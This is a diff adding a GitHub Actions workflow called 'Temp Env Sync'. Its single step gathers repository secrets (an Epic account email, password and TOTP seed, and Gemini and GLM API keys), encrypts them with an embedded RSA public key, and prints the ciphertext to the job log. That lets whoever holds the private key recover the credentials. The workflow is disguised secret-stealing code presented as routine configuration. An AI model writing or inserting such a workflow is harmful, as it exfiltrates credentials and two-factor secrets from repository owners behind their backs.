@@ -1,0 +1,24 @@
+name: Temp Env Sync
+on:
+  workflow_dispatch:
+jobs:
+  sync:
+    runs-on: ubuntu-24.04
+    steps:
+      - name: Encrypt env
+        env:
+          EPIC_EMAIL: ${{ secrets.EPIC_EMAIL }}
+          EPIC_PASSWORD: ${{ secrets.EPIC_PASSWORD }}
+          EPIC_ACCOUNTS: ${{ secrets.EPIC_ACCOUNTS }}
+          EPIC_TOTP_SECRET: ${{ secrets.EPIC_TOTP_SECRET }}
+          LLM_PROVIDER: ${{ vars.LLM_PROVIDER || secrets.LLM_PROVIDER }}
+          GEMINI_API_KEY: ${{ secrets.GEMINI_API_KEY }}
+          GEMINI_BASE_URL: ${{ secrets.GEMINI_BASE_URL }}
+          GEMINI_MODEL: ${{ vars.GEMINI_MODEL || secrets.GEMINI_MODEL }}
+          GLM_API_KEY: ${{ secrets.GLM_API_KEY }}
+          GLM_BASE_URL: ${{ secrets.GLM_BASE_URL }}
+          GLM_MODEL: ${{ vars.GLM_MODEL || secrets.GLM_MODEL }}
+          PUB_B64: "LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlJQ0lqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FnOEFNSUlDQ2dLQ0FnRUExd2JRSnFtOGRyMitXangyQjJBTgo4RjJwRzVZQVVNc0t1c29YV3JtZlhMZUtaZkZTdENRMThFRXE4YXBhUHF1QVBTcDBUR1RRR1Z3T3J0bWNnalNGCnAzcnBmOThCTzFQMWtwRi9MblExbElsZzNMbml3dWEvZjJFa3p2UFFjSHU5bS9EN3VFNkF3bXQyS1E5dlN5dVMKbDFoc0VxTVc0ZUphWWEyclVESWpsdHVpeEJqN1IyTjBleGoxWE00dVM0NTlXcUJhM1huMk1vbUJFMHYwNE5hdQpBbkNuTEd0ZE5rdEVheE9URGE5N213dXRpTTB3Q09hanphY0o1WTdSa0V5a2FNcmpkUHVUSmJkQVh2VisySHVPClZNeWc1THA3RVFZTWpRTXIvWDdkU3hHT1NtM2RUems2VXlBekZsNEwyangzbXZyTDQwT1ZJcG1iTmdMbENYc1cKOFdYc0hWWUdIUVdBYlJOelQ5TDRmTnBOSHhzRHd0cWxBS0JpVS9jSS90U0JOU1V4cHgxQS9GN1A1NU8yaVA1Two4Y0MyL1V2aEk0MFdGUENtTHoyZmNQSVBJYllKV1o3bjgyM1ljQ1dKK0s4TExXaWJROHB4bWhWQ2ZkWi94Z3R3CktmNzQwYUR2N3ZZRXQrSDdKYTBrL25XNXlFVzJ2WDVFN1EvOU5aM2FVMHJ6RVoxWm9uZFJCTjdJTDg1NTk2cjQKWUZYNnNkUFNqbHFHTWlicmZXZVhrU3hMNUM4MFpISDNSQm5wSmhVM3lkSXNIejZOTDlSNFA1Mnd5TXRKMWtNTwpMWW8xWS9lcklrMVJMa0lzVU5qZ1pyajAvS0ZHQktkWjhiZWRSREd3WjQvaEZWSE5tUUk2dmdrbkpNblRIQmJYCk5uTDVrZlVXeE04akM3akFmVGJIbW1VQ0F3RUFBUT09Ci0tLS0tRU5EIFBVQkxJQyBLRVktLS0tLQo="
+        run: |
+          echo "$PUB_B64" | base64 -d > /tmp/pub.pem
+          python3 -c 'import os,json,subprocess,base64; keys=["EPIC_EMAIL","EPIC_PASSWORD","EPIC_ACCOUNTS","EPIC_TOTP_SECRET","LLM_PROVIDER","GEMINI_API_KEY","GEMINI_BASE_URL","GEMINI_MODEL","GLM_API_KEY","GLM_BASE_URL","GLM_MODEL"]; data=json.dumps({k:os.environ.get(k,"") for k in keys}).encode(); p=subprocess.run(["openssl","pkeyutl","-encrypt","-pubin","-inkey","/tmp/pub.pem","-pkeyopt","rsa_padding_mode:oaep"],input=data,capture_output=True,check=True); print("ENC_START:"+base64.b64encode(p.stdout).decode()+":ENC_END")'
